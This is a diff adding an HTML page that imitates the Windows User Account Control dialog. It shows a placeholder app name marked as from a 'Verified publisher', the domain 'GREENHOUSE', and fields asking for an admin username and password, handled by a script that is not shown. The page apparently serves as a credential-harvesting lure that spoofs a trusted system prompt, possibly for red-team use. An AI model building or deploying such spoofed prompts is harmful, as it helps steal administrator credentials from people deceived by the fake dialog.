@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>User Account Control</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="uac-dialog">
+    <div class="dialog-header">
+      <span class="header-text">User Account Control</span>
+      <button id="close-button" class="close-button">✕</button>
+    </div>
+    
+    <div class="dialog-content">
+      <div class="main-message">
+        <p>Do you want to allow this app to make changes to your device?</p>
+      </div>
+      
+      <div class="app-info">
+        <div class="app-icon">
+          <img src="assets/custom-icon.svg" alt="Printer" width="36" height="36">
+        </div>
+        <div class="app-details">
+          <p class="app-name">sdfsdfsdf</p>
+          <p class="publisher">Verified publisher: sdfsdfsdf</p>
+          <a href="#" id="details-link" class="details-link">Show more details</a>
+        </div>
+      </div>
+      
+      <div class="credentials-section">
+        <p class="credentials-instruction">To continue, enter an admin username and password.</p>
+        
+        <div class="input-group">
+          <input type="text" id="username" class="credential-input" placeholder="User name">
+        </div>
+        
+        <div class="input-group">
+          <input type="password" id="password" class="credential-input" placeholder="Password">
+        </div>
+        
+        <div class="domain-info">
+          <p>Domain: GREENHOUSE</p>
+        </div>
+      </div>
+    </div>
+    
+    <div class="dialog-footer">
+      <button id="yes-button" class="action-button yes-button">Yes</button>
+      <button id="no-button" class="action-button no-button">No</button>
+    </div>
+  </div>
+  
+  <script src="renderer.js"></script>
+</body>
+</html>
